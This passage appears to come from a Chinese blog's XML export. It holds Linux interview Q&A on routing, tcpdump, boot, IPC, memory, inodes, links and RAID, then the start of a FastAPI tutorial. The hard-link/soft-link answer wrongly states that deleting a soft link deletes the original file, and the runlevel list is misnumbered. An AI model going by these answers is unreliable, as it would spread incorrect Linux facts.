ACCEP</span><br></pre></td></tr></table></figure></li><li><p>另外，要注意使用 <code>iptables save</code> 命令，进行保存。否则，服务器重启后，配置的规则将丢失。</p></li></ul><h2 id="54-route-命令？"><a href="#54-route-命令？" class="headerlink" title="54.route 命令？"></a>54.route 命令？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><strong>route命令</strong>用来显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。</p><p>在Linux系统中设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的<a href="http://man.linuxde.net/ip">ip</a>地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在<code>/etc/rc.local</code>中添加route命令来保证该路由设置永久有效。</p><h2 id="55-添加一条到-192-168-3-0-24-的路由，网关为-192-168-1-254-？"><a href="#55-添加一条到-192-168-3-0-24-的路由，网关为-192-168-1-254-？" class="headerlink" title="55.添加一条到 192.168.3.0/24 的路由，网关为 192.168.1.254 ？"></a>55.添加一条到 192.168.3.0/24 的路由，网关为 192.168.1.254 ？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>输入命令 <code>route add -net 192.168.3.0/24 netmask 255.255.255.0 gw 192.168.1.254</code> 。</p><h2 id="56-查看本机路由的三种方式？"><a href="#56-查看本机路由的三种方式？" class="headerlink" title="56.查看本机路由的三种方式？"></a>56.查看本机路由的三种方式？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@centos6 ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination Gateway Genmask Flags Metric Ref Use Iface</span><br><span class="line">192.168.220.0 0.0.0.0 255.255.255.0 U 1 0 0 eth1</span><br><span class="line">169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0</span><br><span class="line">172.16.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth0</span><br><span class="line">0.0.0.0 172.16.0.1 0.0.0.0 UG 0 0 0 eth0</span><br><span class="line"></span><br><span class="line">[root@centos6 ~]# netstat -nr</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination Gateway Genmask Flags MSS Window irtt Iface</span><br><span class="line">192.168.220.0 0.0.0.0 255.255.255.0 U 0 0 0 eth1</span><br><span class="line">169.254.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth0</span><br><span class="line">172.16.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth0</span><br><span class="line">0.0.0.0 172.16.0.1 0.0.0.0 UG 0 0 0 eth0</span><br><span class="line"></span><br><span class="line">[root@centos6 ~]# ip route</span><br><span class="line">192.168.220.0/24 dev eth1 proto kernel scope link src 192.168.220.157 metric 1</span><br><span class="line">169.254.0.0/16 dev eth0 scope link metric 1002</span><br><span class="line">172.16.0.0/16 dev eth0 proto kernel scope link src 172.16.251.6</span><br><span class="line">default via 172.16.0.1 dev eth0 proto static</span><br></pre></td></tr></table></figure><h2 id="57-tcpdump-命令？"><a href="#57-tcpdump-命令？" class="headerlink" title="57.tcpdump 命令？"></a>57.tcpdump 命令？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><strong>tcpdump命令</strong>是一款sniffer工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用<code>-w</code>选项将数据包保存到文件中，方便以后分析。</p><h2 id="58-在-Linux-系统下如何按照下面要求抓包：只过滤出访问-HTTP-服务的，目标-IP-为-192-168-0-111-，一共抓-1000-个包，并且保存到-1-cap-文件中？？"><a href="#58-在-Linux-系统下如何按照下面要求抓包：只过滤出访问-HTTP-服务的，目标-IP-为-192-168-0-111-，一共抓-1000-个包，并且保存到-1-cap-文件中？？" class="headerlink" title="58. 在 Linux 系统下如何按照下面要求抓包：只过滤出访问 HTTP 服务的，目标 IP 为 192.168.0.111 ，一共抓 1000 个包，并且保存到 1.cap 文件中？？"></a>58. 在 Linux 系统下如何按照下面要求抓包：只过滤出访问 HTTP 服务的，目标 IP 为 192.168.0.111 ，一共抓 1000 个包，并且保存到 1.cap 文件中？？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nn -s0 host 192.168.0.111 and port 80 -c 1000 -w 1.cap</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统题库（二）</title>
      <link href="/posts/23750.html"/>
      <url>/posts/23750.html</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统题库（二）"><a href="#操作系统题库（二）" class="headerlink" title="操作系统题库（二）"></a>操作系统题库（二）</h1><h2 id="4-什么是-Linux-内核？"><a href="#4-什么是-Linux-内核？" class="headerlink" title="4.什么是 Linux 内核？"></a>4.什么是 Linux 内核？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>Linux内核是操作系统最基础的程序。其中包括设备CPU、GPU、摄像头、USB等驱动，包括文件管理程序、进程调度程序等最基本的底层功能程序。并提供一系列的底层接口，供应用层开发程序，例如视频播放器、浏览器等。</p><p><font style="background-color:#e91e64">答案</font></p><p>Linux 系统的核心是内核。内核控制着计算机系统上的所有硬件和软件，在必要时分配硬件，并根据需要执行软件。</p><ol><li>系统内存管理</li><li>应用程序管理</li><li>硬件设备管理</li><li>文件系统管理</li></ol><h2 id="5-Linux-开机启动过程？"><a href="#5-Linux-开机启动过程？" class="headerlink" title="5. Linux 开机启动过程？"></a>5. Linux 开机启动过程？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>Linux开机过程实际上是内核程序的启动，启动内存管理程序、进程调度程序。然后进度调度程序会去启动一些预设的自启的第三方应用，通常启动脚本配置在<code>/etc/init.d</code>目录下。</p><p><font style="background-color:#e91e64">答案</font></p><p>1、主机加电自检，加载 BIOS 硬件信息。</p><ul><li>2、读取 MBR 的引导文件(GRUB、LILO)。</li><li>3、引导 Linux 内核。</li><li>4、运行第一个进程 init (进程号永远为 1 )。</li><li>5、进入相应的运行级别。</li><li>6、运行终端，输入用户名和密码。</li></ul><h2 id="6-Linux系统缺省的运行级别？"><a href="#6-Linux系统缺省的运行级别？" class="headerlink" title="6. Linux系统缺省的运行级别？"></a>6. Linux系统缺省的运行级别？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><ol><li>关机。</li><li>单机用户模式。</li><li>字符界面的多用户模式(不支持网络)。</li><li>字符界面的多用户模式。</li><li>未分配使用。</li><li>图形界面的多用户模式。</li><li>重启。</li></ol><h2 id="7-Linux-使用的进程间通信方式？"><a href="#7-Linux-使用的进程间通信方式？" class="headerlink" title="7. Linux 使用的进程间通信方式？"></a>7. Linux 使用的进程间通信方式？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><ol><li><p>管道(pipe)、流管道(s_pipe)、有名管道(FIFO)。</p></li><li><p>信号(signal) 。</p></li><li><p>消息队列。</p></li><li><p>共享内存。</p></li><li><p>信号量。</p></li><li><p>套接字(socket) 。</p></li></ol><h2 id="8-Linux-有哪些系统日志文件？"><a href="#8-Linux-有哪些系统日志文件？" class="headerlink" title="8. Linux 有哪些系统日志文件？"></a>8. Linux 有哪些系统日志文件？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>参见 <a href="http://c.biancheng.net/cpp/html/2783.html">《Linux 系统日志及日志分析》</a> 文章，比较重要的是 <code>/var/log/messages</code> 日志文件。</p><blockquote><p>该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。</p><p>另外，如果胖友的系统里有 ELK 日志集中收集，它也会被收集进去。</p></blockquote><h2 id="9-Linux-虚拟内存是什么？"><a href="#9-Linux-虚拟内存是什么？" class="headerlink" title="9.Linux 虚拟内存是什么？"></a>9.Linux 虚拟内存是什么？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>虚拟内存这里指的是swap吧，Linux Swap是将内存的一部分用于缓存文件，用于提升文件读写的性能，在进程需要分配内存的时候，又会将这部分脏页写入磁盘，将这部分内存用于应用程序。</p><p>要知道通常内存和磁盘的读写性能都是有明显的差距，使用内存做文件缓存，能够提升IO读写。</p><p><font style="background-color:#e91e64">答案</font></p><p><strong>Linux为每个进程维护了一个单独的虚拟地址空间</strong>。虚拟地址空间分为内核空间与用户空间，用户空间包括代码、数据、堆、共享库以及栈，内核空间包括内核中的代码和数据结构，内核空间的某些区域被映射到所有进程共享的物理页面。<strong>Linux也将一组连续的虚拟页面（大小等于内存总量）映射到相应的一组连续的物理页面，这种做法为内核提供了一种便利的方法来访问物理内存中任何特定的位置。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/523e8ef97804fd93a450859c74c4a69e~tplv-t2oaga2asx-watermark.webp"></p><p><strong>Linux将虚拟内存组织成一些区域（也称为段）的集合，区域的概念允许虚拟地址空间有间隙。一个区域就是已经存在着的已分配的虚拟内存的连续片（chunk）</strong>。例如，代码段、数据段、堆、共享库段，以及用户栈都属于不同的区域，<strong>每个存在的虚拟页都保存在某个区域中，而不属于任何区域的虚拟页是不存在的，也不能被进程所引用。</strong></p><p>内核为系统中的每个进程维护一个单独的任务结构（task_struct）。<strong>任务结构中的元素包含或者指向内核运行该进程所需的所有信息（PID、指向用户栈的指针、可执行目标文件的名字、程序计数器等）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/523e8ef97804fd93a450859c74c4a69e~tplv-t2oaga2asx-watermark.webp"></p><ul><li>mm_struct：描述了虚拟内存的当前状态。pgd指向一级页表的基址（当内核运行这个进程时，pgd会被存放在CR3控制寄存器，也就是页表基址寄存器中），mmap指向一个vm_area_structs的链表，其中每个vm_area_structs都描述了当前虚拟地址空间的一个区域。</li><li>vm_starts：指向这个区域的起始处。</li><li>vm_end：指向这个区域的结束处。</li><li>vm_prot：描述这个区域内包含的所有页的读写许可权限。</li><li>vm_flags：描述这个区域内的页面是与其他进程共享的，还是这个进程私有的以及一些其他信息。</li><li>vm_next：指向链表的下一个区域结构。</li></ul><h2 id="10-简单-Linux-文件系统？"><a href="#10-简单-Linux-文件系统？" class="headerlink" title="10.简单 Linux 文件系统？"></a>10.简单 Linux 文件系统？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><strong>在 Linux 操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。</strong></p><p>也就是说在 Linux 系统中有一个重要的概念：<strong>一切都是文件</strong>。其实这是 Unix 哲学的一个体现，而 Linux 是重写 Unix 而来，所以这个概念也就传承了下来。在 Unix 系统中，把一切资源都看作是文件，包括硬件设备。UNIX系统把每个硬件都看成是一个文件，通常称为设备文件，这样用户就可以用读写文件的方式实现对硬件的访问。</p><p>Linux 支持 5 种文件类型，如下图所示：<img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230617210617.png" alt="文件类型"></p><h2 id="11-Linux-的目录结构是怎样的？"><a href="#11-Linux-的目录结构是怎样的？" class="headerlink" title="11.Linux 的目录结构是怎样的？"></a>11.Linux 的目录结构是怎样的？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>Linux 文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录：<br><a href="http://static.iocoder.cn/5c2f54f28d4eabbe138fd8cbb763a1f1"><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/5c2f54f28d4eabbe138fd8cbb763a1f1" alt="Linux的目录结构"></a>Linux的目录结构</p><p><strong>常见目录说明：</strong></p><ul><li><strong>/bin：</strong> 存放二进制可执行文件(ls,cat,mkdir等)，常用命令一般都在这里；</li><li><strong>/etc：</strong> 存放系统管理和配置文件；</li><li><strong>/home：</strong> 存放所有用户文件的根目录，是用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示；</li><li><strong>/usr ：</strong> 用于存放系统应用程序；</li><li><strong>/opt：</strong> 额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把tomcat等都安装到这里；</li><li><strong>/proc：</strong> 虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息；</li><li><strong>/root：</strong> 超级用户（系统管理员）的主目录（特权阶级o）；</li><li><strong>/sbin:</strong> 存放二进制可执行文件，只有root才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如ifconfig等；</li><li><strong>/dev：</strong> 用于存放设备文件；</li><li><strong>/mnt：</strong> 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统；</li><li><strong>/boot：</strong> 存放用于系统引导时使用的各种文件；</li><li><strong>/lib ：</strong> 存放着和系统运行相关的库文件 ；</li><li><strong>/tmp：</strong> 用于存放各种临时文件，是公用的临时文件存储点；</li><li><strong>/var：</strong> 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等；</li><li><strong>/lost+found：</strong> 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows下叫什么.chk）就在这里。</li></ul><h2 id="12-什么是-inode-？"><a href="#12-什么是-inode-？" class="headerlink" title="12. 什么是 inode ？"></a>12. 什么是 inode ？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>理解inode，要从文件储存说起。</p><p>文件储存在硬盘上，硬盘的最小存储单位叫做<strong>“扇区”（Sector）</strong>。<strong>每个扇区储存512字节（相当于0.5KB）</strong>。</p><p>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种<strong>由多个扇区组成的“块”，是文件存取的最小单位</strong>。“块”的大小，<strong>最常见的是4KB</strong>，即连续八个 sector组成一个 block。</p><p>文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方<strong>储存文件的元信息</strong>，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做<code>inode</code>，中文译名为<strong>“索引节点”</strong>。</p><p>每一个文件都有对应的<code>inode</code>，里面包含了与该文件有关的一些信息。</p><h2 id="13-简述-Linux-文件系统通过-inode-节点把文件的逻辑结构和物理结构转换的工作过程？"><a href="#13-简述-Linux-文件系统通过-inode-节点把文件的逻辑结构和物理结构转换的工作过程？" class="headerlink" title="13.简述 Linux 文件系统通过 inode 节点把文件的逻辑结构和物理结构转换的工作过程？"></a>13.简述 Linux 文件系统通过 inode 节点把文件的逻辑结构和物理结构转换的工作过程？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>Linux 通过 inode 节点表将文件的逻辑结构和物理结构进行转换。</p><ul><li>inode 节点是一个 64 字节长的表，表中包含了文件的相关信息，其中有文件的大小、文件所有者、文件的存取许可方式以及文件的类型等重要信息。在 inode 节点表中最重要的内容是磁盘地址表。在磁盘地址表中有 13 个块号，文件将以块号在磁盘地址表中出现的顺序依次读取相应的块。</li><li>Linux 文件系统通过把 inode 节点和文件名进行连接，当需要读取该文件时，文件系统在当前目录表中查找该文件名对应的项，由此得到该文件相对应的 inode 节点号，通过该 inode 节点的磁盘地址表把分散存放的文件物理块连接成文件的逻辑结构。</li></ul><h2 id="14-什么是硬链接和软链接？"><a href="#14-什么是硬链接和软链接？" class="headerlink" title="14.什么是硬链接和软链接？"></a>14.什么是硬链接和软链接？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>软连接是指将一个链接文件的路径指向一个原始文件的所在路径，链接文件类似windows的快捷方式，并未在内存中真正存在，当访问链接文件时，会指向真实文件所在路径。</p><p><font style="background-color:#e91e64">答案</font></p><ul><li><p>硬链接</p><ul><li>由于 Linux 下的文件是通过索引节点(inode)来识别文件，硬链接可以认为是一个指针，指向文件索引节点的指针，系统并不为它重新分配 inode 。每添加一个一个硬链接，文件的链接数就加 1 。</li></ul></li></ul><ul><li>不足：1）不可以在不同文件系统的文件间建立链接；2）只有超级用户才可以为目录创建硬链接。</li></ul><ul><li><p>软链接</p><ul><li>软链接克服了硬链接的不足，没有任何文件系统的限制，任何用户可以创建指向目录的符号链接。因而现在更为广泛使用，它具有更大的灵活性，甚至可以跨越不同机器、不同网络对文件进行链接。</li></ul></li></ul><ul><li>不足：因为链接文件包含有原文件的路径信息，所以当原文件从一个目录下移到其他目录中，再访问链接文件，系统就找不到了，而硬链接就没有这个缺陷，你想怎么移就怎么移；还有它要系统分配额外的空间用于建立新的索引节点和保存原文件的路径。</li></ul><p>总结区别如下：</p><ul><li>硬链接不可以跨分区，软件链可以跨分区。</li><li>硬链接指向一个 inode 节点，而软链接则是创建一个新的 inode 节点。</li><li>删除硬链接文件，不会删除原文件，删除软链接文件，会把原文件删除。</li></ul><h2 id="15-RAID-是什么？"><a href="#15-RAID-是什么？" class="headerlink" title="15.RAID 是什么？"></a>15.RAID 是什么？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>RAID 全称为独立磁盘冗余阵列(Redundant Array of Independent Disks)，基本思想就是把多个相对便宜的硬盘组合起来，成为一个硬盘阵列组，使性能达到甚至超过一个价格昂贵、 容量巨大的硬盘。RAID 通常被用在服务器电脑上，使用完全相同的硬盘组成一个逻辑扇区，因此操作系统只会把它当做一个硬盘。</p><p>RAID 分为不同的等级，各个不同的等级均在数据可靠性及读写性能上做了不同的权衡。在实际应用中，可以依据自己的实际需求选择不同的 RAID 方案。</p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统题库（一）</title>
      <link href="/posts/52412.html"/>
      <url>/posts/52412.html</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统题库（一）"><a href="#操作系统题库（一）" class="headerlink" title="操作系统题库（一）"></a>操作系统题库（一）</h1><h2 id="1-Linux常用命令"><a href="#1-Linux常用命令" class="headerlink" title="1.Linux常用命令"></a>1.Linux常用命令</h2><p><font style="background-color: #8bc34a">作答</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ls top free df du awk sed vi zip/unzip tar gzip cp mv rm grep cat echo export ssh</span><br></pre></td></tr></table></figure><p>这些都是我比较常用的命令。</p><p><font style="background-color:#e91e64">答案</font></p><p>常用命令</p><ol><li>目录相关<ol><li>find 命令</li><li>ls 命令</li><li>pwd 命令</li><li>cd 命令</li></ol></li><li>mkdir 命令<ol><li>df 命令</li><li>rm 命令</li><li>mv 命令</li><li>cp 命令</li><li>mount 命令</li><li>cat 命令</li><li>tail 命令</li><li>less 命令</li></ol></li><li>通用命令<ol><li>grep 命令</li><li>sed 命令</li><li>awk 命令</li><li>vim 命令</li><li>diff 命令</li><li>sort 命令</li><li>xargs 命令</li></ol></li><li>压缩相关<ol><li>tar 命令</li><li>gzip 命令</li><li>bzip2 命令</li><li>unzip 命令</li></ol></li><li>系统命令<ol><li>export 命令</li><li>kill 命令</li><li>passwd 命令</li><li>su 命令</li><li>yum 命令</li><li>rpm 命令</li><li>shutdown 命令</li><li>crontab 命令</li><li>service 命令</li><li>chmod 命令</li><li>chown 命令</li><li>uname 命令</li><li>whereis 命令</li><li>locate 命令</li><li>man 命令</li></ol></li><li>网络相关<ol><li>ifconfig 命令</li><li>ping 命令</li><li>curl 命令</li><li>wget 命令</li><li>ftp 命令</li><li>ssh 命令</li><li>ps 命令</li><li>uptime 命令</li><li>dmesg 命令</li><li>vmstat 命令</li><li>mpstat 命令</li><li>pidstat 命令</li><li>iostat 命令</li><li>free 命令</li><li>sar 命令</li><li>top 命令</li><li>netstat 命令</li></ol></li></ol><h2 id="2-Linux体系结构"><a href="#2-Linux体系结构" class="headerlink" title="2.Linux体系结构"></a>2.Linux体系结构</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>从大的方面讲，Linux 体系结构可以分为两块：<a href="https://img-blog.csdn.net/20170401170616835?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM2Mzk3MTQx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">Linux 体系结构</a></p><ul><li>用户空间(User Space) ：用户空间又包括用户的应用程序(User Applications)、C 库(C Library) 。</li><li>内核空间(Kernel Space) ：内核空间又包括系统调用接口(System Call Interface)、内核(Kernel)、平台架构相关的代码(Architecture-Dependent Kernel Code) 。</li></ul><h2 id="3-为什么-Linux-体系结构要分为用户空间和内核空间的原因？"><a href="#3-为什么-Linux-体系结构要分为用户空间和内核空间的原因？" class="headerlink" title="3.为什么 Linux 体系结构要分为用户空间和内核空间的原因？"></a>3.为什么 Linux 体系结构要分为用户空间和内核空间的原因？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><ol><li>现代 CPU 实现了不同的工作模式，不同模式下 CPU 可以执行的指令和访问的寄存器不同。</li><li>Linux 从 CPU 的角度出发，为了保护内核的安全，把系统分成了两部分。</li></ol><p>用户空间和内核空间是程序执行的<strong>两种不同的状态</strong>，我们可以通过两种方式完成用户空间到内核空间的转移：</p><ol><li>系统{调用；</li><li>硬件中断。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastAPI中文教程（一）</title>
      <link href="/posts/180.html"/>
      <url>/posts/180.html</url>
      
        <content type="html"><![CDATA[<h1 id="FastAPI系列教程（一）"><a href="#FastAPI系列教程（一）" class="headerlink" title="FastAPI系列教程（一）"></a>FastAPI系列教程（一）</h1><h2 id="教程资源"><a href="#教程资源" class="headerlink" title="教程资源"></a>教程资源</h2><p><a href="https://christophergs.com/tutorials/ultimate-fastapi-tutorial-pt-1-hello-world/">ChristopherGS的英文教程</a></p><p><a href="https://github.com/pyb4430/full-stack-fastapi-postgresql">pyb4430/full-stack-fastapi-postgresql: Full stack, modern web application generator. Using FastAPI, PostgreSQL as database, Docker, automatic HTTPS and more. (github.com)</a></p><blockquote><p>上面的教程是根据FastAPI全栈生成的项目模板进行讲解的，对于有一定基础、熟悉容器化技术、熟悉部署细节的同学，可以快速的掌握FastAPI的用法，进行生产项目的开发。</p><p>[pyb4430/full-stack-fastapi-postgresql]仓库是fork的官方并进行积极维护的一个仓库，至该文章编写时间2023/3/12官方仓库对于旧模块失效出现多处bug仍未进行修复，推荐根据该全栈仓库学习全栈部署。</p></blockquote><blockquote><p>官方文档是最好的学习教程，FastAPI作者Tangolo比较忙，经常开坑，FastAPI的文档更新也不是很完善，部分章节内容没有进行更新（例如没有详细讲解依赖注入的异步写法，或者大多代码使用的都是非异步写法，SQLalchemy也没详细讲解异步写法），这部分虽然不是很重要，可以在模块官方和Python进阶教程里面学习到，但是对于初学者就不是很友好，无法系统的学习，会感觉到混乱。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>至文章编写时间，目前Python Web框架从性能上来讲，FastAPI基于Starlette开发，处于Python Web开发框架的最优选。据调查（根据目前数个Web<a href="https://www.techempower.com/benchmarks/#section=data-r21">框架基准测试排行网站</a>），从基准测试来说，FastAPI能达到同时13000并发请求时，同为Python框架的Django、Flask只能达到1k-2k。但是如果要同Golang的GoFrame、Gin、Echo、Iris等框架轻松实现10W+请求数相比，不足为论。如果用Golang，非常推荐GoFrame框架，文档齐全、社区活跃、性能优秀，并且是国人开源并积极维护。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230312224716.png"><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230312224755.png"></p><blockquote><p>注：该调查虽然不严谨，但是有大概的参考价值，Web开发细节复杂，性能高低可根据开发者经验和技术进行优化，但是框架的基准测试则比较稳定。</p></blockquote><blockquote><p>Django-Ninja框架目前也备受关注，经过试用，确实是能够与普通的django程序比有极大的性能提升。但是考虑到仍然基于django框架开发，数据库对异步的支持不高，社区开源项目不丰富，称不上是一个优秀的选择。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230312225035.png"></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230312225257.png"></p><p>Swoole框架是由C语言编写的高性能请求框架，单论请求数来说，能够实现同比30w+的并发请求数。但是真正运营于web开发，需要编写路由功能、请求解析、数据校验、数据库交互等，如laravel-swoole也才16000并发请求数。</p><p>所以同学们讨论这个问题不能太片面，像本文重点FastAPI web开发框架是基于Starlette请求框架开发的，Startlette请求框架又是基于Uvicorn异步框架（Python高性能ASGI异步协议库）开发的，尽快其性能再强大，web开发中需要编写路由功能、请求解析、数据校验、数据库交互、安全验证等，最终也会和FastAPI框架差不多，甚至不如。而直接使用FastAPI框架，能够快速开发web网站，其自带Pydantic数据校验（Python数据校验和解析库，备受关注，非常推荐开发自己的项目时使用）等功能，有不少的开源项目和示例，<a href="https://github.com/tiangolo/fastapi/issues">github issue</a>容易查找你开发时遇见的常见问题。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官方项目使用Poetry这个Python环境管理工具，所以官方项目里面是没有requirement.txt文件的，笔者初步尝试，感觉不错，后面讲解一下这个工具的简单使用。<a href="https://fastapi.tiangolo.com/zh/">官方文档地址</a>有部分中文翻译章节，可以参考。</p><p>首先安装<code>FastAPI</code>模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fastapi</span><br></pre></td></tr></table></figure><p>还需要安装ASGI服务器，笔者这里使用<a href="https://www.uvicorn.org/">Uvicorn</a>，官方文档中 <a href="https://gitlab.com/pgjones/hypercorn">Hypercorn</a>也是支持的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uvicorn[standard] <span class="comment"># 最小安装</span></span><br></pre></td></tr></table></figure><p>这样就能编写最简单的FastAPI项目了。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_root</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Hello&quot;</span>: <span class="string">&quot;World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_item</span>(<span class="params">item_id: <span class="built_in">int</span>, q: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="literal">None</span>] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;q&quot;</span>: q&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line">uvicorn.run(app)</span><br></pre></td></tr></table></figure><p>运行代码可以简单访问并获取响应了，<code>http://127.0.0.1:8000</code>可以获取返回内容。</p><h2 id="API文档"><a href="#API文档" class="headerlink" title="API文档"></a>API文档</h2><p>FastAPI自带API文档，<strong>通过路由映射自动生成OpenAPI文件</strong>（一种接口协议规格文件），并提供两种UI界面展示，分别是<strong>Swagger 